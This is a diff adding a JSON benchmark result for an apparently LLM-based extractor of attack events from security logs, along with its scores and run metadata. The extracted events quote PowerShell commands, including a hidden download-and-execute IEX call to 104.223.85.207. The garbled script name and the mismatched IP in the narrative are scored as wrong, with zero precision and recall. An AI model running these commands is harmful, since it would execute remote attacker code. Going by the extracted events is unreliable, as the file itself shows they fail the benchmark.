@@ -1,0 +1,72 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u0014\u066d\u070b\u0570\u06bc\u0627\u0646\u0614\u067e\u0650\u0627\u0633\u062a\u0650\u060c\u0628\u0650.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('104.223.85.207:8082/a'))\\\"\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @C:\\Users\\Administrator\\AppData\\Local\\Temp\\4iwlyhn4\\4iwlyhn4.cmdline",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -File T1059.004.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('104.223.85.207:8082/a'))\\\"\"",
+        "stage": "Initial Access"
+      }
+    ],
+    "narrative": "The narrative begins when an adversary uses 'Initial Access' via executing PowerShell commands to download malicious scripts from an unknown source (124.223.85.207) using the new-object.net.webclient method. Then they use 'Execution' methods such as running the downloaded script with bypassing policy restrictions. Following that, there might be attempts at establishing persistence through registry modifications.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 77361,
+      "completion_tokens": 878,
+      "total_tokens": 78239,
+      "wall_clock_s": 55.411,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 5,
+      "fn": 37
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 5,
+      "fn": 37,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.5,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 77361,
+      "completion_tokens": 878,
+      "total_tokens": 78239,
+      "wall_clock_s": 55.411,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
